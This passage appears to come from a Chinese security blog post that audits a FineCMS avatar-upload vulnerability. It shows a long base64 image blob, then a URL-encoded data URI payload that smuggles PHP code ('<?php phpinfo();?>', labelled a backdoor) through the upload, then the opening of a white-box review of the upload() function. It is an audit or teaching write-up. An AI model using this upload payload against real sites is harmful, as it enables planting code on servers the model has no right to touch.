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</span></span><br></pre></td></tr></table></figure><p>问题的关键点在于：上传后，不知道上传后的后门文件的具体位置，测试不出来。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">改为后门：</span><br><span class="line">data%<span class="number">3</span>Aimage%<span class="number">2</span>Fphp%<span class="number">3</span>Bbase64%<span class="number">2</span>C%<span class="number">2</span>F9j%<span class="number">2</span>FPD9waHAgcGhwaW5mbygpOz8+</span><br></pre></td></tr></table></figure><p>黑盒思路：寻找上传点抓包修改突破获取状态码及地址<br>审计流程：功能点-代码文件-代码块-抓包调试-验证测试</p><h3 id="白盒审计"><a href="#白盒审计" class="headerlink" title="白盒审计"></a>白盒审计</h3><p>观察，发现其数据包有点像框架。</p><p>白盒审计代码：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 路径信息：finecms/dayrui/controllers/member/Account.php</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">upload</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 创建图片存储文件夹</span></span><br><span class="line">    <span class="variable">$dir</span> = SYS_UPLOAD_PATH.<span class="string">&#x27;/member/&#x27;</span>.<span class="variable 